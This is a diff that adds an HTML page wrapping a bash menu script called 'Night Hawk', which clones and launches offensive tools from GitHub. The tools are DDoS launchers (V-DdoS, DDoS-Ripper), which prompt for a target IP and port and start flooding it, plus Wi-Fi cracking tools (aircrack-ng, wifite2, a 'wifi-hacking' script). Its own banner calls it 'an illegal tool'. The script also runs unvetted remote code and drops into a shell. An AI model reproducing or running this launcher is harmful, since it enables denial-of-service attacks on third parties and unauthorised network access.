@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+    <head><title>Night Hawk Script</title></head/
+    <body>
+<pre>
+#!/usr/bin/env bash
+
+# === 7‑Slot Auto Launcher with Python Version Detection ===
+
+NAMES=(
+  "Termux4all Setup"
+  "I-killer Setup"
+  "V-DdoS Setup"
+  "DDoS-Ripper Setup"
+  "Aircrack-ng Setup"
+  "Wifite2 Setup"
+  "Wifi-Hacking Setup"
+)
+
+# --- Python Script Runner ---
+runpythonscript() {
+    script="$1"
+    shebang=$(head -n 1 "$script" 2>/dev/null)
+
+    if echo "$shebang" | grep -q "python2"; then
+        echo "[+] Detected python2"
+        command -v python2 >/dev/null && python2 "$script" || echo "[!] python2 not available"
+    elif echo "$shebang" | grep -q "python3"; then
+        echo "[+] Detected python3"
+        python3 "$script"
+    else
+        echo "[+] Defaulting to python"
+        if command -v python >/dev/null; then
+            python "$script"
+        else
+            python3 "$script"
+        fi
+    fi
+}
+
+# --- Slot Definitions ---
+slot1() {
+    echo "[+] Running: ${NAMES[0]}"
+    apt update && apt install -y python-is-python3 bash git
+    [ -d "termux4all" ] || git clone https://www.github.com/shansuharban/termux4all.git
+    cd termux4all && chmod +x * && ./t4all.sh
+}
+
+slot2() {
+    echo "[+] Running: ${NAMES[1]}"
+    apt update && apt upgrade -y && apt install -y git pv
+    [ -d "I-killer" ] || git clone https://github.com/Dark-Legends/I-killer
+    cd I-killer && chmod +x install.sh i-killer
+    ./install.sh && ./i-killer
+}
+
+slot3() {
+    echo "[+] Running: ${NAMES[2]}"
+    apt update && apt upgrade -y
+    apt install -y python-is-python3 git figlet
+    [ -d "V-DdoS" ] || git clone https://www.github.com/T34mV18rs/V-DdoS.git
+    cd V-DdoS && chmod +x V-DdoS.py
+    python2 V-DdoS.py
+}
+
+slot4() {
+    echo "[+] Running: ${NAMES[3]}"
+    apt install -y git python-is-python3 python3 unzip
+    [ -d "DDoS-Ripper" ] || git clone https://github.com/palahsu/DDoS-Ripper.git
+    cd DDoS-Ripper && ls
+
+    export LANG=en_US.UTF-8
+    export LC_ALL=en_US.UTF-8
+    export TERM=xterm-256color
+    export COLORTERM=truecolor
+
+    echo -e "\033[1;37m"
+    echo "██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗"
+    echo "██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗"
+    echo "██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝"
+    echo "██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗"
+    echo "██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║██║     ██║     ███████╗██║  ██║"
+    echo "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝"
+    echo -e "\033[0m"
+
+    echo -e "\033[1;36m#GenieRipper\nreference by Hammer\033[0m"
+
+    echo -e "\033[1;35m
+It is user's responsibility to obey all applicable laws.
+We assume no liability and are not responsible for any misuse or damage caused by this program.
+Use this tool only when you have permission or your IP is visible. Please, make sure you are anonymous!
+\033[0m"
+
+    echo -e "\033[1;37musage: python3 DRipper.py [-h] [-s] [-t] [-i]
+
+options:
+  -h, --help            show this help message and exit
+  -s, --server          [IP]
+  -t, --time            [Target time]
+  -i, --threads         [Target IP or domain(s)]\033[0m"
+
+    echo "[+] Launching Free version of DRipper.py..."
+    read -p "[?] Target IP or domain (-s): " target
+    read -p "[?] Port (-p, default 80): " port
+    read -p "[?] Turbo (-t, default 135): " turbo
+
+    python3 DRipper.py -s "$target" -p "$port" -t "$turbo"
+
+    echo "[+] Dropping into shell inside DDoS-Ripper..."
+    bash
+    exit 0
+}
+
+slot5() {
+    echo "[+] Running: ${NAMES[4]}"
+    apt update && apt install -y aircrack-ng
+    read -p "[?] Enter path to .cap/.pcap file: " capfile
+    if [ -f "$capfile" ]; then
+        aircrack-ng "$capfile"
+    else
+        echo "[!] File not found: $capfile"
+    fi
+}
+
+slot6() {
+    echo "[+] Running: ${NAMES[5]}"
+    apt update && apt upgrade -y
+    apt install -y git python-is-python3 python3 python3-pip iw net-tools wireshark reaver hashcat hcxdumptool aircrack-ng
+    [ -d "wifite2" ] || git clone https://github.com/derv82/wifite2.git
+    cd wifite2 && pip install pexpect --break-system-packages
+    python3 -m wifite --capture-dir=~/wifite-captures
+}
+
+slot7() {
+    echo "[+] Running: ${NAMES[6]}"
+    apt update && apt install -y git python-is-python3 python3 cmatrix
+    [ -d "wifi-hacking.py" ] || git clone https://github.com/akashblackhat/wifi-hacking.py.git
+    cd wifi-hacking.py
+    runpythonscript wifi-hacking.py
+}
+
+# --- Menu with NIGHT HAWK Banner ---
+show_menu() {
+    echo -e "\033[1;31m"
+    echo "███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗    ██╗  ██╗ █████╗ ██╗    ██╗██╗  ██╗"
+    echo "████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝    ██║  ██║██╔══██╗██║    ██║██║ ██╔╝"
+    echo "██╔██╗ ██║██║██║  ███╗███████║   ██║       ███████║███████║██║ █╗ ██║█████╔╝ "
+    echo "██║╚██╗██║██║██║   ██║██╔══██║   ██║       ██╔══██║██╔══██║██║███╗██║██╔═██╗ "
+    echo "██║ ╚████║██║╚██████╔╝██║  ██║   ██║       ██║  ██║██║  ██║╚███╔███╔╝██║  ██╗"
+    echo "╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝"
+    echo "                                MADE BY DREW"
+    echo -e "\033[0m"
+
+    echo -e "\033[1;33mThis Tool Is An Illegal Tool & It's Only For Proof Of Concept."
+    echo "Use It At Your Own Risk. I Will Not Be Responsible For Any Kind Of Problems."
+    echo
+
+    echo "=== Auto Launcher Menu ==="
+    for i in {1..7}; do
+        echo "$i) ${NAMES[$((i-1))]}"
+    done
+    echo "q) Quit"
+}
+
+# --- Main Loop ---
+while true; do
+    show_menu
+    read -p "Choose a slot (1‑7 or q): " choice
+    case $choice in
+        1) slot1 ;;
+        2) slot2 ;;
+        3) slot3 ;;
+        4) slot4 ;;
+        5) slot5 ;;
+        6) slot6 ;;
+        7) slot7 ;;
+        q|Q) echo "Exiting..."; break ;;
+        *) echo "[!] Invalid choice" ;;
+    esac
+done
+
+<pre>
+    <body>
+<html>
